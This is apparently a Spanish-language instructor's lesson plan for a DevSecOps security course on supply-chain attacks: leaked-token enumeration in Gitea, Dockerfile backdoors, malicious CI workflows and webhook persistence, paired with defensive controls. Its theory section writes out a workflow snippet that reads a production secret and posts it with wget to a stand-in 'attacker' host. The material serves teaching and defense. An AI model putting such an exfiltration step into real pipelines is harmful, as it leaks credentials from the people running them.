# Clase 2 - Pre-commit y cadena de suministro

**Duracion:** 3 h · **Modulo:** M3 · **Labs:** 02, 03 (autonomo), 04, 05, 06
**Nivel:** medio
**Entrega:** [Asignable 1](../labs/ASIGNABLE-1.md), que cubre los labs 00-09 e
incluye los cinco labs de esta clase.

## Resultado esperado

Al terminar la clase el alumno entiende que un repo, una extension y un
`Dockerfile` son codigo ejecutable en la cadena, y que el control de acceso al
codigo es el control de acceso a produccion. Sabe enumerar con un PAT, leer un
secreto de un workflow y explicar por que rotar no es borrar.

## Agenda (180 min)

| Min | Bloque | Contenido | Recurso |
|---|---|---|---|
| 0-10 | Apertura | Repaso de la clase 1 y encuadre de la supply chain | este documento |
| 10-50 | Teoria | Puesto de trabajo, repo, secretos, workflows, imagenes, webhooks | este documento |
| 50-55 | Descanso | | |
| 55-85 | Lab | Enumeracion con un PAT filtrado | `labs/02-gitea-enumeration.md` |
| 85-105 | Lab | Dockerfile backdoor | `labs/04-dockerfile-backdoor.md` |
| 105-135 | Lab | Workflow malicioso en Gitea Actions | `labs/05-gitea-actions.md` |
| 135-155 | Demo | Webhook como persistencia | `labs/06-webhook.md` |
| 155-175 | Defensa | Controles por eslabon y deteccion | Anexo, secciones 3 y 8 |
| 175-180 | Cierre | Entrega del Asignable 1 y puente a la clase 3 | este documento |

Si el grupo va lento, el lab 06 se convierte en demo del instructor y el 03 se
asigna como tarea. No sacrifiques el 02 ni el 05: son la base de los labs 06 y
08.

## Objetivos de aprendizaje

1. Enumerar una organizacion con un token personal y medir su alcance real.
2. Explicar por que un secreto en Git sigue vivo despues de borrarlo.
3. Modificar un artefacto sin tocar la aplicacion (Dockerfile, workflow).
4. Distinguir permisos de repo (`push`, `admin`) y lo que cada uno habilita.
5. Usar un webhook como canal de reconocimiento y persistencia.
6. Proponer controles de pre-commit, revision y salida de red.

## Teoria

### 1. El eslabon mas blando: el puesto de trabajo

El desarrollador tiene acceso a repos, tokens, claves cloud, `kubeconfig` y
entornos locales. Su laptop ejecuta codigo de terceros a diario: extensiones
del editor, hooks de Git, dependencias, scripts de `npm install`. El lab 03
demuestra que una extension "util" puede leer el entorno y abrir una shell sin
explotar nada.

La leccion no es "no instales extensiones", es: **el puesto es parte de la
cadena de suministro y necesita el mismo trato que el CI** (allowlist, perfil
aislado, secretos fuera del home, egress).

### 2. El repo como frontera de confianza

| Permiso | Que permite | Consecuencia |
|---|---|---|
| read | clonar, ver issues | fuga de codigo y secretos |
| write / push | cambiar ramas | alterar lo que se construye |
| admin | webhooks, protecciones, acciones | persistencia y control del CI |
| token con scope `all` | todo lo anterior | una llave para la organizacion |

Un PAT es una credencial de usuario, no de aplicacion. `/user/repos` devuelve
los repos privados a los que ese usuario tiene acceso, cosa que una busqueda
publica no hace. Ese salto es el hallazgo del lab 02.

### 3. Secretos: donde viven y por que rotar

Los secretos aparecen en el codigo, en el historial de Git, en los logs de CI,
en variables de entorno, en imagenes y en artefactos. Un secreto commiteado no
se elimina con `git rm`:

- sigue en los commits anteriores y en los reflogs,
- puede estar en forks, caches y pipelines ya ejecutados,
- y el token sigue siendo valido hasta que se revoca.

La respuesta correcta es **rotar** y despues limpiar. El lab 17 lo demuestra
con gitleaks sobre el historial.

### 4. Workflows y Dockerfiles son codigo

Un workflow de Actions se ejecuta en un runner con secretos. Quien puede
editarlo puede leerlos:

```yaml
env:
  KEY: ${{ secrets.PROD_KEY }}
run: wget -qO- --post-data "key=$KEY" http://attacker/
```

Un `Dockerfile` tambien es codigo: `ENTRYPOINT`, `RUN`, `COPY` y las imagenes
base determinan que se ejecuta cuando el contenedor arranca. Cambiar el
`ENTRYPOINT` deja la app intacta y el backdoor dentro del artefacto (lab 04).

Regla mental: **todo lo que el pipeline interpreta es codigo; todo lo que el
pipeline ejecuta hereda sus permisos.**

### 5. Tags mutables e imagenes

Un tag (`:1`, `:latest`) es una etiqueta movible. Dos despliegues con el mismo
tag pueden ejecutar contenido distinto. La defensa es desplegar por digest y
firmar la imagen. Sin eso, quien puede empujar al registry controla produccion
aunque no toque el repo.

En 2026, CVE-2026-33634 llevo esto al extremo: se force-pushearon 76 tags de
`trivy-action` y se sustituyeron los de `setup-trivy` por codigo que robaba
credenciales del runner. El lab 05 ejercita el caso con un workflow propio; el
lab 18 muestra como verificar el digest. Regla para el informe: fijar por SHA,
no por tag.

### 6. Webhooks: el canal que sobrevive

Un webhook es una URL que recibe cada evento del repo. No caduca, no pide
interaccion y pasa desapercibido en revisiones. Para el atacante es
reconocimiento continuo (que se commitea, cuando, por quien) y persistencia si
pierde el acceso interactivo. Para el defensor es una lista que hay que revisar
y una allowlist de dominios de salida.

### 7. Cadena de ataque de la clase

```
PAT en repo publico (02)
   -> repo privado + permisos (02)
   -> webhook persistente (06)
   -> cambio de workflow (05) o Dockerfile (04)
   -> secreto de CI / artefacto con backdoor
```

Cada flecha usa lo que la anterior dejo: el mismo patron que se repetira en
Jenkins y en Terraform.

## Demo del instructor (20 min)

1. Crear el webhook con el PAT y hacer un push vacio.
2. Mostrar la entrega en hookcat con la cabecera `X-Gitea-Event`.
3. Ensenar que el webhook sigue ahi tras cerrar sesion: la persistencia no
   depende de la sesion.
4. Borrarlo y explicar por que "borrar el hook" no invalida el token.

## Laboratorio

| Lab | Tiempo | Se evalua |
|---|---|---|
| 02 - Enumeracion con PAT | 30 min | alcance del token, repo privado, evidencia |
| 04 - Dockerfile backdoor | 20 min | `ENTRYPOINT` vs `CMD`, shell y flag |
| 05 - Workflow malicioso | 30 min | exfiltracion de `PROD_KEY`, limpieza del repo |
| 06 - Webhook (demo) | 20 min | creacion, entrega y persistencia |
| 03 - Extension VS Code | autonomo | manifiesto, `activationEvents`, exfiltracion |

En el lab 05, recordar: el runner usa `alpine`; el step debe declarar
`shell: sh` y usar `wget`, no `bash` ni `curl`.

## Preguntas para discusion

1. Que privilegio minimo necesita un token que solo clona un repo?
2. Si encuentras un token en un repo publico, cual es el primer paso: borrarlo
   o medir su alcance?
3. Por que un webhook es mas peligroso que un issue abierto?
4. Que control impide que un PR de un fork lea secretos?
5. Que diferencia hay entre firmar una imagen y escanearla?

## Defensa (20 min)

Ejercicio: para cada eslabon (puesto, repo, workflow, imagen, webhook), escribir
un control preventivo y uno de deteccion.

| Eslabon | Prevencion | Deteccion |
|---|---|---|
| Puesto | allowlist de extensiones, perfil aislado | `node -> /bin/sh`, egress raro |
| Repo | branch protection, CODEOWNERS, PAT con scope | push a `main` sin revision |
| Workflow | aprobacion para `.gitea/workflows` | diff de workflow por usuario no CI |
| Imagen | firma, digest, registry inmutable | tag reescrito, imagen no firmada |
| Webhook | solo admin, allowlist de destinos | hook nuevo o destino desconocido |

## Evaluacion

| Criterio | Puntos | Entregable de la clase |
|---|---|---|
| Ejecucion | 25 | labs 02, 04 y 05 completados |
| Explicacion | 25 | por que el token da acceso al repo privado y por que rotar |
| Evidencia | 20 | repos, diff del workflow, peticion `/actions/leak` |
| Impacto | 15 | que secreto o artefacto queda comprometido |
| Defensa | 15 | tabla de controles y una regla de deteccion |

Esta tabla es el desglose de la clase. La nota final sale de la rubrica de 100
puntos del [Asignable 1](../labs/ASIGNABLE-1.md), que ademas pide los labs 00-01
y 07-09. Los criterios coinciden; cambia el alcance de la evidencia.

## Materiales

- Runner de Gitea **Online**; si no, `make ci`.
- hookcat vacio al empezar (`curl -s http://localhost:8888/__clear`).
- Repo `devops-org/devops-demo` sembrado desde `seed/repo` (`1e819e4`).
- Para el lab 03: VS Code o VSCodium y un perfil desechable.

## Errores comunes del instructor

| Sintoma | Causa / arreglo |
|---|---|
| El step falla con `bash: not found` | el runner es alpine: `shell: sh` y `wget` |
| No llega el webhook | desde Gitea es `http://hookcat:8888`, no `localhost` |
| El workflow no se dispara | el runner esta offline o el push no toco `main` |
| El Dockerfile arranca `entrypoint.sh` | se uso `CMD`; hay que sustituir `ENTRYPOINT` |
| El secreto no aparece | `PROD_KEY` no existe: revisar Settings -> Actions -> Secrets |

## Limpieza al terminar

- Revertir el workflow o restaurar `main` con `git push -f` desde `seed/repo`.
- Borrar el webhook creado en el lab 06.
- Vaciar hookcat.

## Trabajo autonomo

- Lab 03 completo en una VM o perfil aislado.
- Cerrar el cuaderno de evidencias del Asignable 1 con los labs 00-01 y 07-09.
- Lab 17 (gitleaks) como lectura previa a la clase 4: cuantos secretos hay en
  el historial y por que no basta borrarlos.
- Media pagina: "que cambiaria si el repo fuera privado y con revision
  obligatoria?".

## Puente a la clase 3

La clase 2 ataco el codigo y el artefacto. La clase 3 entra en el motor: un
Jenkins expuesto que ejecuta lo que le digan y guarda credenciales que pueden
descifrarse desde dentro.
